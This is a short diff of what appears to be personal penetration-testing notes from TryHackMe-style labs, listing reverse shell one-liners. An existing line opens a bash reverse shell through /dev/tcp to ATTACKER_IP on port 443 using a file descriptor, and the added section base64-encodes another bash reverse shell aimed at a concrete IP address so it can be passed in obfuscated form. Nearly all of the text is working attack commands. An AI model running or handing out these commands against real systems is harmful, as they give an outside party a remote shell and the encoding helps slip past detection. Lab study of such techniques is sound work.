@@ -94,3 +94,10 @@ Rev shell with File descriptor 5
 target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
 ```
 
+---
+
+### base 64 encoding it
+
+```sh
+echo -n /bin/bash -c 'bash -i >& /dev/tcp/10.18.21.236/443 0>&1' | base64 -w0
+```
